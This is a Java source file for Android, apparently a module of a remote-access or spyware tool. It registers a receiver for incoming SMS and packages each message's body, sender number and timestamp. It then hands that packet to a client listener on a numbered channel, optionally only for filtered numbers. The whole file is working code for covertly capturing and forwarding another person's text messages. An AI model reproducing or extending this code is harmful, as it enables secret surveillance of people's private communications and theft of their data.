package my.app.Library;

import java.util.HashSet;

import my.app.client.ClientListener;
import utils.EncoderHelper;
import Packet.ShortSMSPacket;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;

public class SMSMonitor {

	ClientListener ctx;
	HashSet<String> phoneNumberFilter;
	int channel;

	protected BroadcastReceiver SMSreceiver = new BroadcastReceiver() {

		private final String SMS_RECEIVED = "android.provider.Telephony.SMS_RECEIVED";

		@Override
		public void onReceive(Context context, Intent intent) {

			if (intent.getAction().equals(this.SMS_RECEIVED)) { // On vérifie
																// que c'est
																// bien un event
																// de
																// SMS_RECEIVED
																// même si c'est
																// obligatoirement
																// le cas.
				Log.i("SMSReceived", "onReceive sms !");

				final Bundle bundle = intent.getExtras();
				if (bundle != null) {
					final Object[] pdus = (Object[]) bundle.get("pdus");

					final SmsMessage[] messages = new SmsMessage[pdus.length];
					for (int i = 0; i < pdus.length; i++)
						messages[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
					if (messages.length > -1) {

						final String messageBody = messages[0].getMessageBody();
						final String phoneNumber = messages[0].getDisplayOriginatingAddress();
						final long date = messages[0].getTimestampMillis();

						if (SMSMonitor.this.phoneNumberFilter == null) {
							final ShortSMSPacket sms = new ShortSMSPacket(phoneNumber, date,
								messageBody);
							SMSMonitor.this.ctx.handleData(SMSMonitor.this.channel, sms.build());
						} else if (SMSMonitor.this.phoneNumberFilter.contains(phoneNumber)) {
							Log.i("SMSReceived", "Message accepted as triggering message !");
							final ShortSMSPacket sms = new ShortSMSPacket(phoneNumber, date,
								messageBody);
							SMSMonitor.this.ctx.handleData(SMSMonitor.this.channel, sms.build());
						}
					}
				}
			}
		}
	};

	public SMSMonitor(ClientListener c, int chan, byte[] args) {
		this.ctx = c;
		this.channel = chan;
		this.phoneNumberFilter = EncoderHelper.decodeHashSet(args);
		final IntentFilter filter = new IntentFilter();
		filter.addAction("android.provider.Telephony.SMS_RECEIVED"); // On
																		// enregistre
																		// un
																		// broadcast
																		// receiver
																		// sur
																		// la
																		// reception
																		// de
																		// SMS
		this.ctx.registerReceiver(this.SMSreceiver, filter);
	}

	public void stop() {
		this.ctx.unregisterReceiver(this.SMSreceiver);
	}

}
